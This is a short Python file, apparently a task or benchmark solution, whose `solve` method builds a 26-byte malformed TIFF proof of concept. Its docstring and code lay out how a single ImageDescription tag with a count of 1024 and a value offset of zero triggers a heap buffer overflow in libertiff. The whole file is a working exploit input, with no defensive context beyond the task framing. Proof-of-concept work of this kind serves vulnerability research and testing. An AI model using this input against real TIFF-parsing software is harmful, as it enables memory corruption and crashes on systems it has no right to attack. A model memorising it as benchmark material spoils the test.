import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a Heap Buffer Overflow in libertiff caused by 
        invalid offline tags with a value offset of zero.
        
        Strategy:
        1. Create a valid TIFF header (Little Endian).
        2. Create an Image File Directory (IFD).
        3. Insert a tag that is "offline" (data size > 4 bytes) so the parser uses the offset field.
        4. Set the offset to 0.
        5. Set the count to a large value (e.g., 1024) to ensure it reads past the file bounds
           causing a heap buffer overflow during the read operation.
        """
        
        # TIFF Header
        # Byte Order: 'II' (0x4949) - Little Endian
        # Version: 42 (0x002A)
        # Offset to first IFD: 8 (0x00000008)
        header = struct.pack('<2sHI', b'II', 42, 8)
        
        # IFD Entry Construction
        # We need an offline tag. 
        # Tag: ImageDescription (0x010E) is a good candidate (Type ASCII).
        # Type: 2 (ASCII)
        # Count: 1024 (Resulting size 1024 bytes > 4 bytes, forcing offset usage)
        # Offset: 0 (Trigger value)
        tag_id = 0x010E
        tag_type = 2
        count = 1024
        offset = 0
        
        # Pack the directory entry: Tag(2), Type(2), Count(4), Offset(4)
        dir_entry = struct.pack('<HHII', tag_id, tag_type, count, offset)
        
        # IFD Construction
        # Number of entries: 1
        num_entries = struct.pack('<H', 1)
        
        # Next IFD offset: 0 (End of list)
        next_ifd = struct.pack('<I', 0)
        
        # Assemble the PoC
        # Total length: 8 (Header) + 2 (Num) + 12 (Entry) + 4 (Next) = 26 bytes
        poc = header + num_entries + dir_entry + next_ifd
        
        return poc